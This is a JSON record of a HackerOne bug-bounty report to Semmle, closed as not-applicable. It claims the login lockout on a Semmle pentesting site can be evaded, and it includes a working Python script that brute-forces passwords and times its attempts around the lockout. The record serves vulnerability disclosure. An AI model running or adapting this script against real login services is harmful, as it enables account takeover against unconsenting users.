{
  "id": 504362,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MDQzNjI=",
  "url": "https://hackerone.com/reports/504362",
  "title": "the login blocking mechanism does not work correctly",
  "state": "Closed",
  "substate": "not-applicable",
  "severity_rating": "medium",
  "readable_substate": "N/A",
  "created_at": "2019-03-03T03:00:43.856Z",
  "submitted_at": "2019-03-03T03:00:43.856Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "aufzayed",
    "url": "/aufzayed",
    "profile_picture_urls": {
      "small": "https://hackerone.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6ODQ3MzU3LCJwdXIiOiJibG9iX2lkIn19--79aea0e2c83bfdcdae04fff0d7e4e96034100e9d/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJqcGciLCJncmF2aXR5IjoiQ2VudGVyIiwicmVzaXplIjoiNjJ4NjJeIiwiY3JvcCI6IjYyeDYyKzArMCJ9LCJwdXIiOiJ2YXJpYXRpb24ifX0=--2de8067d228529d65848a4eeed0bed0bb2531bc3/RWTI465K_400x400.jpg"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 27264,
    "url": "https://hackerone.com/semmle",
    "handle": "semmle",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/027/264/8af1325fdaccc38beab4451ba68ace24623b248c_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/027/264/8af1325fdaccc38beab4451ba68ace24623b248c_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Semmle",
      "twitter_handle": "semmle",
      "website": "https://semmle.com",
      "about": "Semmle's engineering analytics platform helps leading technology companies and open-source developers build secure, reliable software."
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2019-03-19T11:58:46.854Z",
  "bug_reporter_agreed_on_going_public_at": "2019-03-03T13:19:40.362Z",
  "team_member_agreed_on_going_public_at": "2019-03-19T11:58:46.803Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\nThe login block mechanism does not work correctly because it blocks the login for 1 minute and allows you to sign in again many times with specific pattern by allowing login 2 or 3 times after 1 minute\n\n## Exploitation\n\n1. open https://lgtm-com.pentesting.semmle.net/\n2. try to login with valid E-mail and __do not__ use the correct password\n3. user proxy to intercept requests\n4. extract __nonce__ parameter and __cookies__\n6. add email and passwords list and the values your are extracted at the following script\n\npython3\n```\nimport requests\nimport time\n\nwith open('passwords list path', 'r') as passwords:\n    passwd_index = 0\n    for passwd in passwords:\n        passwd = passwd.split('\\n')[0]\n        HEADERS = {\n\t        'Host': 'lgtm-com.pentesting.semmle.net',\n\t        'Content-Type': 'application/x-www-form-urlencoded',\n\t        'Content-Length': '238',\n\t        'Cookie': ''\n        }\n\n        DATA = {\n\t        'email': 'your valid email',\n\t        'password': passwd,\n\t        'nonce': '',\n\t        'apiVersion': 'b5b3337fa392c83c27f4e05efc4ccbcb2dcf6cbf'\n\n        }\n\n        login = requests.post('https://lgtm-com.pentesting.semmle.net/internal_api/v0.2/login', headers=HEADERS, data=DATA)\n        if login.status_code == 200:\n            print(f'[#] {passwd}')\n            break\n        elif login.status_code == 400:\n            print('[!] sleep 60s')\n            time.sleep(60)\n        elif login.status_code == 401:\n            print(f'[{passwd_index}] {passwd}')\n            time.sleep(5)\n        else:\n            print(login.status_code)\n        passwd_index += 1\n ```\n\nThen watch the results\n\n## Impact\n\nCan take over user account",
  "weakness": {
    "id": 31,
    "name": "Improper Restriction of Authentication Attempts"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 6,
  "voters": [
    "base_64",
    "khizer47",
    "pr0f0x01",
    "cr4xerbik4sh",
    "vincentlaw1",
    "reddmist"
  ],
  "severity": {
    "rating": "medium",
    "score": 6.8,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "high",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "low",
      "integrity": "low",
      "availability": "low"
    }
  },
  "structured_scope": {
    "databaseId": 8552,
    "asset_type": "URL",
    "asset_identifier": "lgtm-com.pentesting.semmle.net",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
